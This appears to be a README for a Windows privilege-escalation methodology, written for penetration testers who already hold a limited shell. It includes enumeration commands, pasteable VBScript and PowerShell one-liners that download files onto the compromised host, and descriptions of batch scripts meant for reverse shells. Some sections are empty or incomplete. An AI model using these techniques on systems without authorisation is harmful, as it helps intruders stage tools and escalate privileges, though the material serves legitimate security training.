# Windows-Privilege-Escalation
Here is my step-by-step windows privlege escalation methodology. This guide assumes you are starting with a very limited shell like a webshell, netcat reverse shell or a remote telnet connection. 

## First things first
Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed.

```
whoami
net user <username>
systeminfo
net config Workstation 
net users 
```

## Uploading files to the Windows machine  
Most of the time we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate.  
We will look at 3 ways of uploading files to a remote Windows machine from Kali Linux:  
1. VBScript HTTP Downloader
2. PowerShell HTTP Downloader
3. Python HTTP Downloader
3. Remote FTP Downloader

### Uploading Files with VBScript  
First lets test to see if we can run VBScript  
```
echo WScript.StdOut.WriteLine "Yes we can run vbscript!" > testvb.vbs
```
Now we run it to see the results:  
```
cscript testvb.vbs
```
If you see the following message, we are good to go with VBScript!:  
```
C:\Users\Test>cscript testvb.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

Yes we can run vbscript!
```
If you see the following messages, you should move on to PowerShell:  
```
C:\temp>cscript testvb.vbs
This program is blocked by group policy. For more information, contact your system administrator.
C:\temp>testvb.vbs
Access is denied.
```

Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it.
If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script:
```
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```
If Windows is a newer version (Windows 10 or Server 2016), try the following code:
```
echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```

### Uploading Files with PowerShell  

```
(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
```


Powershell Invoke Web Request:

Windows XP / Server 2003 / Windows 7


*Easy*

**Passwords**
Passwords can be one of the easiest methods of privledge escalation and there are some tools that can help with this process.


**CopyAndPasteFileDownloader.bat**

Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line)

**CopyAndPasteEnum.bat**

No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial).
Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report

**enumeration.md** 

Basic notes on Windows Enumeration from the OSCP.

**windows_recon.bat**

An uploadable batch file for performing basic windows enumeration.
